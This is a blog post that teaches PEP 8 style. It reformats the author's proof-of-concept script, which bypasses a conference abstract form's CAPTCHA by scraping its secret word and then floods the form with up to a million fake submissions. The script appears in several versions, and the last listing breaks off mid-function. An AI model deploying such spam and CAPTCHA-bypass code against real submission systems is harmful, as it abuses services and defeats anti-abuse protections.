@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link href='http://fonts.googleapis.com/css?family=Noticia+Text:400,700' rel='stylesheet' type='text/css' />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="description" content="">
+    <meta name="author" content="Sean Beck">
+
+    <title> Improving Readability with PEP 8 | Show Me the Code </title>
+
+    <link rel="stylesheet" href="/theme/css/style.css" type="text/css" />
+    <link rel="stylesheet" href="/theme/css/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="/theme/css/font-awesome.css" type="text/css"/>
+    <link rel="shortcut icon" href="/theme/images/favicon.ico">
+  </head>
+  <body>
+    <div class=container>
+<div class="header">
+    <a href="/index.html">Show Me the Code</a> <span class="muted"></span>
+</div>
+
+<div class=navigation>
+    <ul>
+            <li><a href="/index.html">Blog</a> </li>
+            <li><a href="/archives.html">Archive</a> </li>
+            <li><a href="/tags.html">Tags</a> </li>
+            <li><a href="/about.html">About</a> </li>
+    </ul>
+</div>
+<div class=separator></div>        
+        <div class=body>
+    <h1 class="title"> Improving Readability with PEP 8</h1>
+    <p class=date> Jul 26, 2014 </p>
+    <p><a href="http://legacy.python.org/dev/peps/pep-0008/">PEP 8</a> is the Python language's style guide. It is generally accepted by the Python community as the best guidelines for readability. To prove it we are going to take poorly written code and improve it to follow the <a href="http://legacy.python.org/dev/peps/pep-0008/">PEP 8</a> guidelines. Before following this you should read through <a href="http://legacy.python.org/dev/peps/pep-0008/">PEP 8</a> so you have an idea of the different guidelines. You should also install two tools called <code>pep8</code> and <a href="http://www.pylint.org/"><code>pylint</code></a>. You can run them on each of your source files to check for excellent styling. Install <code>pep8</code> via pip <code>pip install pep8</code> and <code>pylint</code> through your package manager (unless you're on OS X or Windows...then use pip). </p>
+<p>Here is our starting source file. It is the code I used as a proof-of-concept for an attack on a <a href="https://seanmckaybeck.com/2014/06/06/spamming-a-submission-system/">submission system</a> and it could use some cleaning. Please note as the actual source file differs slightly from what is shown below, so some of the error messages may refer to lines differently, and some lines may not have errors mentioned about them even though they are problematic.</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randrange</span>
+
+<span class="k">def</span> <span class="nf">get_the_secret</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+    <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;\&quot;(.+?)\&quot;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">matches</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">grab_the_page</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+
+<span class="k">def</span> <span class="nf">grab_the_word_key</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;name&#39;</span><span class="p">:</span> <span class="s">&#39;word_key&#39;</span><span class="p">})</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">word_key</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;value&#39;</span><span class="p">]))</span>
+
+<span class="k">def</span> <span class="nf">parse_the_page</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">labels</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;label&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">&#39;To prove you are a human type&#39;</span> <span class="ow">in</span> <span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+            <span class="k">return</span> <span class="n">get_the_secret</span><span class="p">(</span><span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://suchredacted.bike&#39;</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">grab_the_page</span><span class="p">()</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">grab_the_word_key</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="n">word_value</span> <span class="o">=</span> <span class="n">parse_the_page</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="n">dictionary</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Jargon&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">first_names</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Given-Names&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">last_names</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Family-Names&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">num_to_spam</span> <span class="o">=</span> <span class="mi">1000000</span>
+    <span class="n">degree_levels</span> <span class="o">=</span> <span class="p">[</span> <span class="s">&#39;Undergraduate&#39;</span><span class="p">,</span> <span class="s">&#39;Masters&#39;</span><span class="p">,</span> <span class="s">&#39;Doctorate&#39;</span> <span class="p">]</span>
+    <span class="n">advisors_nums</span> <span class="o">=</span> <span class="p">[</span> <span class="s">&#39;169&#39;</span><span class="p">,</span> <span class="s">&#39;171&#39;</span><span class="p">,</span> <span class="s">&#39;g_127&#39;</span><span class="p">,</span> <span class="s">&#39;g_129&#39;</span><span class="p">,</span> <span class="s">&#39;g_132&#39;</span> <span class="p">]</span> <span class="c"># all valid cs teachers</span>
+    <span class="c"># sp4m that submission system!</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_to_spam</span><span class="p">):</span>
+        <span class="n">first_name</span> <span class="o">=</span> <span class="n">first_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">last_name</span> <span class="o">=</span> <span class="n">last_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">email</span> <span class="o">=</span> <span class="n">first_name</span><span class="o">+</span><span class="n">last_name</span><span class="o">+</span><span class="s">&#39;@gmail.com&#39;</span>
+        <span class="n">degree_level</span> <span class="o">=</span> <span class="n">degree_levels</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">degree_levels</span><span class="p">))]</span>
+        <span class="n">department</span> <span class="o">=</span> <span class="s">&#39;2&#39;</span> <span class="c"># this is the code for computer science</span>
+        <span class="n">faculty_advisor</span> <span class="o">=</span> <span class="n">advisors_nums</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">advisors_nums</span><span class="p">))]</span>
+        <span class="n">abstract_title</span> <span class="o">=</span> <span class="n">dictionary</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">abstract</span> <span class="o">=</span> <span class="n">first_name</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">last_name</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">email</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">degree_level</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">department</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">faculty_advisor</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">abstract_title</span>
+        <span class="n">abstract</span> <span class="o">+=</span> <span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">abstract</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;first_name&#39;</span><span class="p">:</span> <span class="n">first_name</span><span class="p">,</span> 
+            <span class="s">&#39;last_name&#39;</span><span class="p">:</span> <span class="n">last_name</span><span class="p">,</span>
+            <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
+            <span class="s">&#39;degree_level&#39;</span><span class="p">:</span> <span class="n">degree_level</span><span class="p">,</span>
+            <span class="s">&#39;department&#39;</span><span class="p">:</span> <span class="n">department</span><span class="p">,</span>
+            <span class="s">&#39;faculty_advisor&#39;</span><span class="p">:</span> <span class="n">faculty_advisor</span><span class="p">,</span>
+            <span class="s">&#39;abstract_title&#39;</span><span class="p">:</span> <span class="n">abstract_title</span><span class="p">,</span>
+            <span class="s">&#39;abstract&#39;</span><span class="p">:</span> <span class="n">abstract</span><span class="p">,</span>
+            <span class="s">&#39;num&#39;</span><span class="p">:</span> <span class="n">word_key</span><span class="p">,</span>
+            <span class="s">&#39;key&#39;</span><span class="p">:</span> <span class="n">word_value</span><span class="p">,</span>
+            <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Submit&#39;</span>
+            <span class="p">}</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">&#39;Finished spamming the submission system&#39;</span>
+</pre></div>
+
+
+<p>Let's run <code>pep8</code> on it and see what happens. </p>
+<div class="highlight"><pre>byu_abstract_exploit/break_abstract_submission.py:6:1: E302 expected 2 blank lines, found 1
+byu_abstract_exploit/break_abstract_submission.py:10:1: E302 expected 2 blank lines, found 1
+byu_abstract_exploit/break_abstract_submission.py:16:1: E302 expected 2 blank lines, found 1
+byu_abstract_exploit/break_abstract_submission.py:21:1: E302 expected 2 blank lines, found 1
+byu_abstract_exploit/break_abstract_submission.py:29:80: E501 line too long (88 &gt; 79 characters)
+byu_abstract_exploit/break_abstract_submission.py:37:22: E201 whitespace after &#39;[&#39;
+byu_abstract_exploit/break_abstract_submission.py:37:62: E202 whitespace before &#39;]&#39;
+byu_abstract_exploit/break_abstract_submission.py:38:22: E201 whitespace after &#39;[&#39;
+byu_abstract_exploit/break_abstract_submission.py:38:62: E202 whitespace before &#39;]&#39;
+byu_abstract_exploit/break_abstract_submission.py:38:64: E261 at least two spaces before inline comment
+byu_abstract_exploit/break_abstract_submission.py:38:80: E501 line too long (87 &gt; 79 characters)
+byu_abstract_exploit/break_abstract_submission.py:44:49: E231 missing whitespace after &#39;,&#39;
+byu_abstract_exploit/break_abstract_submission.py:45:25: E261 at least two spaces before inline comment
+byu_abstract_exploit/break_abstract_submission.py:46:52: E231 missing whitespace after &#39;,&#39;
+byu_abstract_exploit/break_abstract_submission.py:48:80: E501 line too long (124 &gt; 79 characters)
+byu_abstract_exploit/break_abstract_submission.py:50:17: E201 whitespace after &#39;{&#39;
+byu_abstract_exploit/break_abstract_submission.py:50:43: W291 trailing whitespace
+byu_abstract_exploit/break_abstract_submission.py:51:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:52:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:53:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:54:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:55:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:56:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:57:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:58:17: E128 continuation line under-indented for visual indent
+byu_abstract_exploit/break_abstract_submission.py:59:17: E124 closing bracket does not match visual indentation
+</pre></div>
+
+
+<p>Well that is a lot of errors. This is not unexpected as you can just look at the original code and see that it is not very readable. Thankfully <code>pep8</code> is specific about what the errors are and how to fix them. Let's start right from the top and fix the first four errors. </p>
+<p>According to PEP 8 it is ideal for global functions to be separated by two blank lines. This makes it easier to distinguish between the end of one function and the beginning of the next. </p>
+<div class="highlight"><pre>def grab_the_page(url):
+    r = requests.get(url)
+    while r.status_code != 200:
+        r = requests.get(url)
+    return r.content
+
+
+def grab_the_word_key(content):
+    soup = BeautifulSoup(content)
+    word_key = soup.find_all(&#39;input&#39;, attrs={&#39;name&#39;: &#39;word_key&#39;})
+    return str(int(word_key[0][&#39;value&#39;]))
+</pre></div>
+
+
+<p>Notice the difference? This is much more preferrable to one blank line or none at all. </p>
+<p>The next large set of errors is complaining about the indentation level of the key-value pairs in the dictionary <code>data</code>. By PEP 8's rules it is much easier to read through a dictionary like <code>data</code> if all of the contents are aligned. </p>
+<div class="highlight"><pre>data = {&#39;first_name&#39;: first_name, 
+        &#39;last_name&#39;: last_name,
+        &#39;email&#39;: email,
+        &#39;degree_level&#39;: degree_level,
+        &#39;department&#39;: department,
+        &#39;faculty_advisor&#39;: faculty_advisor,
+        &#39;abstract_title&#39;: abstract_title,
+        &#39;abstract&#39;: abstract,
+        &#39;num&#39;: word_key,
+        &#39;key&#39;: word_value,
+        &#39;submit&#39;: &#39;Submit&#39;
+        }
+</pre></div>
+
+
+<p>The closing brace can either be aligned with the keys of the dictionary or be aligned with the declaration of <code>data</code>.   </p>
+<p>The next set complains about unnecessary whitespace in the lists <code>degree_levels</code> and <code>advisors_nums</code>. The extra whitespace does not help readability and can be done away with. While we're at it let's get rid of that comment on the end of the <code>advisors_nums</code> line as it is not helpful either. There is also some missing whitespace after the commas in the following two lines. One space after a comma helps distinguish between the end of one parameter and the beginning of the next.</p>
+<div class="highlight"><pre>degree_level = degree_levels[randrange(0,len(degree_levels))]
+faculty_advisor = advisors_nums[randrange(0,len(advisors_nums))]
+</pre></div>
+
+
+<p>Now all we are left with are two long lines and some trailing whitespace. PEP 8 specifies that lines should be no longer than 79 characters. If a line is longer than that it becomes difficult to determine what the purpose of the entire line is. Python encourages readability and only performing one task per line of code. If a line is too long than it is more than likely violating that rule. In the case of our first long line it does not look long here because I redacted the full URL. There really isn't much I can do about that. However the other line is disgusting. </p>
+<div class="highlight"><pre>abstract = first_name+&#39; &#39;+last_name+&#39; &#39;+email+&#39; &#39;+degree_level+&#39; &#39;+department+&#39; &#39;+faculty_advisor+&#39; &#39;+abstract_title
+</pre></div>
+
+
+<p>To improve the readability of this line we can extend it to run across multiple lines.</p>
+<div class="highlight"><pre>abstract = first_name + &#39; &#39; + last_name + &#39; &#39; + email + \
+    &#39; &#39; + degree_level + &#39; &#39; + department + &#39; &#39; + \
+    faculty_advisor + &#39; &#39; + abstract_title
+</pre></div>
+
+
+<p>That takes care of all of the errors reported by PEP 8 and we finish with the following. </p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randrange</span>
+
+
+<span class="k">def</span> <span class="nf">get_the_secret</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+    <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;\&quot;(.+?)\&quot;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">matches</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">grab_the_page</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+
+
+<span class="k">def</span> <span class="nf">grab_the_word_key</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;name&#39;</span><span class="p">:</span> <span class="s">&#39;word_key&#39;</span><span class="p">})</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">word_key</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;value&#39;</span><span class="p">]))</span>
+
+
+<span class="k">def</span> <span class="nf">parse_the_page</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">labels</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;label&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">&#39;To prove you are a human type&#39;</span> <span class="ow">in</span> <span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+            <span class="k">return</span> <span class="n">get_the_secret</span><span class="p">(</span><span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://somethingsomethingyoucantsee.me&#39;</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">grab_the_page</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">grab_the_word_key</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="n">word_value</span> <span class="o">=</span> <span class="n">parse_the_page</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="n">dictionary</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Jargon&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">first_names</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Given-Names&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">last_names</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Family-Names&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">num_to_spam</span> <span class="o">=</span> <span class="mi">1000000</span>
+    <span class="n">degree_levels</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;Undergraduate&#39;</span><span class="p">,</span> <span class="s">&#39;Masters&#39;</span><span class="p">,</span> <span class="s">&#39;Doctorate&#39;</span><span class="p">]</span>
+    <span class="n">advisors_nums</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;169&#39;</span><span class="p">,</span> <span class="s">&#39;171&#39;</span><span class="p">,</span> <span class="s">&#39;g_127&#39;</span><span class="p">,</span> <span class="s">&#39;g_129&#39;</span><span class="p">,</span> <span class="s">&#39;g_132&#39;</span><span class="p">]</span>
+    <span class="c"># sp4m that submission system!</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_to_spam</span><span class="p">):</span>
+        <span class="n">first_name</span> <span class="o">=</span> <span class="n">first_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">last_name</span> <span class="o">=</span> <span class="n">last_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">email</span> <span class="o">=</span> <span class="n">first_name</span><span class="o">+</span><span class="n">last_name</span><span class="o">+</span><span class="s">&#39;@gmail.com&#39;</span>
+        <span class="n">degree_level</span> <span class="o">=</span> <span class="n">degree_levels</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">degree_levels</span><span class="p">))]</span>
+        <span class="n">department</span> <span class="o">=</span> <span class="s">&#39;2&#39;</span>  <span class="c"># this is the code for computer science</span>
+        <span class="n">faculty_advisor</span> <span class="o">=</span> <span class="n">advisors_nums</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">advisors_nums</span><span class="p">))]</span>
+        <span class="n">abstract_title</span> <span class="o">=</span> <span class="n">dictionary</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">abstract</span> <span class="o">=</span> <span class="n">first_name</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">last_name</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">email</span> <span class="o">+</span> \
+            <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">degree_level</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">department</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> \
+            <span class="n">faculty_advisor</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">abstract_title</span>
+        <span class="n">abstract</span> <span class="o">+=</span> <span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">abstract</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;first_name&#39;</span><span class="p">:</span> <span class="n">first_name</span><span class="p">,</span>
+                <span class="s">&#39;last_name&#39;</span><span class="p">:</span> <span class="n">last_name</span><span class="p">,</span>
+                <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
+                <span class="s">&#39;degree_level&#39;</span><span class="p">:</span> <span class="n">degree_level</span><span class="p">,</span>
+                <span class="s">&#39;department&#39;</span><span class="p">:</span> <span class="n">department</span><span class="p">,</span>
+                <span class="s">&#39;faculty_advisor&#39;</span><span class="p">:</span> <span class="n">faculty_advisor</span><span class="p">,</span>
+                <span class="s">&#39;abstract_title&#39;</span><span class="p">:</span> <span class="n">abstract_title</span><span class="p">,</span>
+                <span class="s">&#39;abstract&#39;</span><span class="p">:</span> <span class="n">abstract</span><span class="p">,</span>
+                <span class="s">&#39;num&#39;</span><span class="p">:</span> <span class="n">word_key</span><span class="p">,</span>
+                <span class="s">&#39;key&#39;</span><span class="p">:</span> <span class="n">word_value</span><span class="p">,</span>
+                <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Submit&#39;</span>
+                <span class="p">}</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">&#39;Finished spamming the submission system&#39;</span>
+</pre></div>
+
+
+<p>This code now conforms to the majority of the PEP 8 standard. However Pylint helps fix the rest of it. Instead of walking you through the process of fixing those errors I will let you do so on your own. <code>pylint</code> is run on your source file from the command line and it gives your code a rating. Even after fixing the prior violations via <code>pep8</code> this code is still only a 5.96 our of 10. To make running <code>pylint</code> on my code easier I use the <code>Syntastic</code> plugin for Vim. I never have to leave Vim and all the syntax imperfections are pointed out to me when I save my file. The perfected code is shown below. It is actually a 9.8/10 because the <code>main()</code> method has too many local variables. However with this script that is hard to avoid. </p>
+<div class="highlight"><pre><span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">This script is a proof-of-concept attack against the abstract submission</span>
+<span class="sd">system for the _______ conference.</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randrange</span>
+
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="k">def</span> <span class="nf">get_the_secret</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    Returns the secret page word</span>
+
+<span class="sd">    text - the HTML containing the secret word</span>
+
+<span class="sd">    This function extracts the secret word from the page</span>
+<span class="sd">    to get around the awful CAPTCHA functionality built</span>
+<span class="sd">    into it. Returns the secret word</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;\&quot;(.+?)\&quot;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">matches</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">grab_the_page</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    Returns the content of the target page</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">content</span>
+
+
+<span class="k">def</span> <span class="nf">grab_the_word_key</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    Returns the HTML containing the secret word</span>
+
+<span class="sd">    content - The entire page HTML</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;name&#39;</span><span class="p">:</span> <span class="s">&#39;word_key&#39;</span><span class="p">})</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;value&#39;</span><span class="p">]))</span>
+
+
+<span class="k">def</span> <span class="nf">parse_the_page</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    Parses the HTML for the target area containing the key word</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
